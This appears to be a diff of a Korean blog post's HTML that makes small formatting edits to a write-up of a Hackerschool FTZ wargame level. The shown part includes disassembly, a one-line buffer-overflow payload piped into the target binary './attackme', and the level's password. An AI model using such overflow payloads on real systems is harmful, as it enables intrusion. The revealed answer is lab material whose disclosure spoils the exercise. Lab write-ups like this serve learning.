@@ -51,9 +51,11 @@ main()
 0x080484e7 &lt;main+63>:   ret
 0x080484e8 &lt;main+64>:   nop
 0x080484e9 &lt;main+65>:   nop</code></pre></div>
-<p>예상했지만, 저번 문제와 똑같다(…) 그냥 저번 문제의 코드에서 주소만 쉘코드 주소로 바꿔서 넣어보니 문제가 풀린다.</p>
+<p>예상했지만, 저번 문제와 똑같다(…)</p>
+<p>그냥 저번 문제의 코드에서 주소만 쉘코드 주소로 바꿔서 넣어보니 문제가 풀린다.</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">(python -c 'print "A"*40+"\x18\xfc\xff\xbf"'; cat) | ./attackme</code></pre></div>
-<h2>비밀번호 : why did you do it</h2>
+<p>비밀번호 : why did you do it</p>
+<hr>
 <h2>Source</h2>
 <ul>
 <li>해커스쿨 FTZ</li>
